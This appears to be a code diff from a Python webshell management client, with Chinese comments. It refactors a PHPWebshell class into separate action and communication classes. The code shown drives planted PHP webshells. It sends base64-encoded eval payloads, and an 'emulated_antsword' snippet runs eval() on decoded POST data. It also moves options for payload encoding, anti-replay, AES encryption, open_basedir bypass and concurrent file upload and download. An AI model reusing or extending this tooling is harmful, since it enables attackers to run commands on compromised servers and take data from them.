@@ -534,7 +534,7 @@ if(!isset($_SESSION[SESSION_NAME])){
 PAYLOAD_SESSIONIZE_CHUNK = 1024
 
 __all__ = [
-    "PHPWebshell",
+    "PHPWebshellActions",
 ]
 
 basic_info_names = {
@@ -609,8 +609,31 @@ async def get_aes_key(pubkey, submitter):
     return session_name, key
 
 
+# PHPWebshellActions和PHPWebshellCommunication分别提供了
+# PHPSessionInterface的实现和连接webshell使用的加密等功能
+
 # 给前端显示的PHPWebshellOptions选项
-php_webshell_conn_options = [
+php_webshell_action_options = [
+
+    ConnOption(
+        id="updownload_chunk_size",
+        name="文件上传下载分块大小",
+        type="text",
+        placeholder="文件上传下载的分块大小，单位为字节，建议在1KB-1024KB之间",
+        default_value=str(1024 * 16),
+        alternatives=None,
+    ),
+    ConnOption(
+        id="updownload_max_coroutine",
+        name="文件上传下载并发量",
+        type="text",
+        placeholder="控制文件上传和下载时的最大协程数量",
+        default_value="4",
+        alternatives=None,
+    ),
+]
+
+php_webshell_communication_options = [
     ConnOption(
         id="encoder",
         name="PHP代码编码器",
@@ -668,39 +691,17 @@ php_webshell_conn_options = [
         default_value=False,
         alternatives=None,
     ),
-    ConnOption(
-        id="updownload_chunk_size",
-        name="文件上传下载分块大小",
-        type="text",
-        placeholder="文件上传下载的分块大小，单位为字节，建议在1KB-1024KB之间",
-        default_value=str(1024 * 16),
-        alternatives=None,
-    ),
-    ConnOption(
-        id="updownload_max_coroutine",
-        name="文件上传下载并发量",
-        type="text",
-        placeholder="控制文件上传和下载时的最大协程数量",
-        default_value="4",
-        alternatives=None,
-    ),
 ]
 
 
 # 注意：在继承的时候必须复用HTTP client（或者至少在cookie里指定session id），否则某些功能无法工作
-class PHPWebshell(PHPSessionInterface):
+class PHPWebshellActions(PHPSessionInterface):
     """PHP session各类工具函数的实现"""
 
     def __init__(self, conn: t.Union[None, dict]):
         # conn是webshell从前端或者数据库接来的字典，可能是上一个版本，没有添加某项的connection info
         # 所以其中的任何一项都可能不存在，需要使用get取默认值
         options = conn if conn is not None else {}
-        self.encoder = options.get("encoder", "raw")
-        self.decoder = options.get("decoder", "raw")
-        self.sessionize_payload = options.get("sessionize_payload", False)
-        self.antireplay = options.get("antireplay", False)
-        self.encryption = options.get("encryption", False)
-        self.bypass_open_basedir = options.get("bypass_open_basedir", False)
         # for upload file and download file
         self.chunk_size = int(options.get("updownload_chunk_size", 1024 * 16))
         self.max_coro = int(options.get("updownload_max_coroutine", 4))
@@ -710,9 +711,6 @@ class PHPWebshell(PHPSessionInterface):
         self.fetchkey_lock = asyncio.Lock()
         self.aes_session_name = None
         self.aes_key = None
-
-        if self.decoder not in decoders:
-            raise exceptions.ServerError(f"找不到Decoder: {self.decoder}")
 
     # --- 以下是Interface的实现，依赖submit函数 ---
 
@@ -901,7 +899,7 @@ class PHPWebshell(PHPSessionInterface):
                 await asyncio.sleep(0.01)  # we don't ddos
                 result = await self.submit(code)
                 done_coro += 1
-                done_bytes += chunk_size # TODO: fix me
+                done_bytes += chunk_size  # TODO: fix me
                 if callback:
                     callback(
                         done_coro=done_coro,
@@ -1005,11 +1003,57 @@ class PHPWebshell(PHPSessionInterface):
         except BinasciiError as exc:
             raise exceptions.PayloadOutputError("base64解码接收到的数据失败") from exc
 
-    # --- 以下是submit函数的相关实现 ---
-    # 这里实现了：
-    # - 在HTML输出中精确找到对应的php代码输出
-    # - encoder和decoder的调用
-    # - 应用防重放、opendir绕过、session暂存payload、AES加密等功能
+    async def php_eval(self, code: str) -> str:
+        result = await self.submit(
+            EVAL_PHP.format(code_b64=string_repr(base64_encode(code)))
+        )
+        return result
+
+    async def php_eval_beforebody(self, code: str) -> t.Tuple[int, str]:
+        # by default its just a renaming of submit_http
+        return await self.submit_http(code)
+
+    async def emulated_antsword(self, body: bytes) -> t.Tuple[int, str]:
+        code = """
+        parse_str(base64_decode(B64), $_POST);
+        eval($_POST['as']);
+        """.replace(
+            "B64", string_repr(base64_encode(body))
+        )
+        return await self.submit_http(code)
+
+    async def submit(self, payload: str) -> str:
+        raise NotImplementedError("子类提供这个函数以驱动这些Actions函数")
+
+    async def submit_http(self, payload: str) -> t.Tuple[int, str]:
+        raise NotImplementedError("子类提供这个函数以驱动这些Actions函数")
+
+
+class PHPWebshellCommunication:
+    """
+    这里实现了
+    - 在HTML输出中精确找到对应的php代码输出
+    - encoder和decoder的调用
+    - 应用防重放、opendir绕过、session暂存payload、AES加密等功能
+
+    这个类需要子类提供submit_http函数，在submit_http的功能之上提供submit函数
+
+    继承时放在PHPWebshellActions之前
+    """
+
+    def __init__(self, conn: t.Union[None, dict]):
+        # conn是webshell从前端或者数据库接来的字典，可能是上一个版本，没有添加某项的connection info
+        # 所以其中的任何一项都可能不存在，需要使用get取默认值
+        options = conn if conn is not None else {}
+        self.encoder = options.get("encoder", "raw")
+        self.decoder = options.get("decoder", "raw")
+        self.sessionize_payload = options.get("sessionize_payload", False)
+        self.antireplay = options.get("antireplay", False)
+        self.encryption = options.get("encryption", False)
+        self.bypass_open_basedir = options.get("bypass_open_basedir", False)
+
+        if self.decoder not in decoders:
+            raise exceptions.ServerError(f"找不到Decoder: {self.decoder}")
 
     def encode(self, payload: str) -> str:
         """应用编码器"""
@@ -1202,22 +1246,3 @@ class PHPWebshell(PHPSessionInterface):
             t.Union[t.Tuple[int, str], None]: 返回的结果，要么为状态码和响应正文，要么为None
         """
         raise NotImplementedError("这个函数应该由实际的实现override")
-
-    async def php_eval(self, code: str) -> str:
-        result = await self.submit(
-            EVAL_PHP.format(code_b64=string_repr(base64_encode(code)))
-        )
-        return result
-
-    async def php_eval_beforebody(self, code: str) -> t.Tuple[int, str]:
-        # by default its just a renaming of submit_http
-        return await self.submit_http(code)
-
-    async def emulated_antsword(self, body: bytes) -> t.Tuple[int, str]:
-        code = """
-        parse_str(base64_decode(B64), $_POST);
-        eval($_POST['as']);
-        """.replace(
-            "B64", string_repr(base64_encode(body))
-        )
-        return await self.submit_http(code)
